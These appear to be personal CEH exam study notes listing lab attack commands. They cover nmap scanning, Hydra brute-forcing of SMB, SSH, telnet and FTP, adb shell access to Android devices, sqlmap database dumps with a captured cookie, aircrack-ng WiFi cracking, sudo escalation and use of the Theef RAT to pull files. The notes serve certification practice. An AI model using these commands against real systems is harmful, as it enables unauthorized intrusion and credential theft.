# Notes
Ever in need make use of it

# CEH Notes

When login sudo arp-scan -local or netdiscover -i 10.10.1.0 or nmap -sn ip/24

1. To find FQDN - Do Nmap and Check results or Check for This PC Properties

Ex- nmap -sC -sV -T4 -A -vv 192.168.205.4

OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2024-07-06T11:15:10-04:00

2. To check for live hosts - Scan using Nmap
Ex- nmap -T4 -A 192.168.x.x/2x

OR 

nmap -T4 -A -p 80,443 192.168.x.x/2x

3. To enumerate SMB - Check for 139, 445 open ports in IPs and Brute force them using Hydra and connect using SMB Client and share/retrieve files.
Ex- nmap -T4 -A -p 139,445 192.168.x.x/2x
OR
nmap -p 139,445 -sV 192.168.x.x/2x

Brute force SMB with hydra
hydra -l USER_NAME -P password_file TARGET_IP smb 
OR
hydra -L Username wordlist Path -P Password wordlist Path IP smb

smbclient //target_ip/ -U USER_NAME 
get file.txt
OR 
smbmap -u USER_NAME -p 'PASSWORD' -H TARGET_IP --download 'C$\file.txt'

If the file is encrypted then Decrypt using BCTextEncoder or SNOW

i.e. snow.exe -C -p “password” file.txt

4. For Mobile IP/Android IP - Check for 5555 Open port in IPs and connect using adb.
Ex- nmap -sV -p 5555 192.168.x.x/2x
adb connect TARGET_IP:5555
adb shell
check for Scan folder - ls; cd sdcard/Scan
adb pull /sdcard/Scan attacker/home -If not able to pull use sudo -i
cd Scan; ls
To install Entropy - apt install ent
ent evil.elf
ent evil2.elf
ent evil3.elf
sha384sum evil.elf
Use Hashcalc

5. To check for Severity score - Use Nmap or Open VAS
Ex- nmap -Pn --script vuln 192.168.xx.xx
OR 
In Open VAS check for EOL of Web dev lang platform vuln CVE IDs

Google them for their CVSS Scores


6. To find secret.txt file/flag in any network - Do nmap -T4 -A 192.168.x.x/2x

OR 

nmap -T4 -A -p 80,443 192.168.x.x/2x

Look out for telnet or ssh and bruteforce it - Since it's a remote login
hydra -L username_file -P password_file TARGET_IP telnet
or
hydra -L username_file -P password_file TARGET_IP ssh

Login to the identified service and search for the file

7. To Check/Decrypt for any sensitive data in a image - Use Openstego
Password will be provided

8. To find flag in FTP - Enumerate for Open ports having port number 21
If port 21 is open then try anonymous login else Brute force it using Hydra
hydra -l uname -P Password wordlist path ftp://IP
ftp IP
ftp>ls
ftp>find . -name secret.txt
or locate secret.txt

9. To perform vertical privilege escalation - Use sudo -i
nmap -sV -A -p 22 IP/24
ssh unmae@IP
pwd
sudo -i
whoami - root ?
cd /
find . -name root.txt or locate root.txt


10. To check for Entropy point of an ELF/exe file - Use DIE Tool or PEid Tool or PeVIEW Tool

Run DIE exe file
Upload Malicious file
Check for Entropy address in advanced

11. To Check for DOS/DDOS - Use Wireshark to obtain IP
Ex- Open Pcap file and search using display filter
i.e. tcp.flags.syn == 1 and tcp.flags.ack == 0

Else Check Statistics > IPv4 Address > Src & Dest > Apply filter

12. To find Login Creds using SQL MAP -

Ex- Login and capture cookie using document.cookie
Try sqlmap -u "URL" --cookie="value;" --dbs = Dumps Databases
sqlmap -u "URL" --cookie="value;" -D dbase --tables = Dumps Tables
sqlmap -u "URL" -cookie="value;" -D dbase -T tablename --dump = Dumps Tabular data of other login creds


13. Can do SQL Injection using copying Burp Request into a text file


14. To find flags in any URL - Can use dirsearch, gobuster for php, html, txt files
For Ex-
dirsearch -e php,html,js,txt -u https://example.com -> for extension search
OR
dirsearch -e php,html,js,txt -u https://example.com -w /usr/share/wordlists/dirb/common.txt -> for wordlist search


15. Use JSQL Tool to dump data and find Flags in it.

16. Login to DVWA using Creds and check for the flag.txt file and Decrypt it using Crackstation or Hashes.com

17. For IOT Publish message capture - Open Pcap and search for MQTT in display filter
Now Check for the Message value or Message Length

18. TO Crack WiFi Creds - Open Cap file
aircrack-ng WEPcrack-01.cap(Path)
KEY FOUND! [________]
aircrack-ng WPA2crack-01.cap(Path) -w password.txt
KEY FOUND! [________]

Else
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [Mac address] pass*.cap
-b = BSSID

19. Use Theef RAT to retieve Secret.txt code from Victim machine.

20. Decrypt Password hash using hashes.com or Crackstation or JohnTheRipper
Obtain the plain password and Decrypt the Veracrypt volume
Then access the flag.txt from Veracrypt volume and submit
 




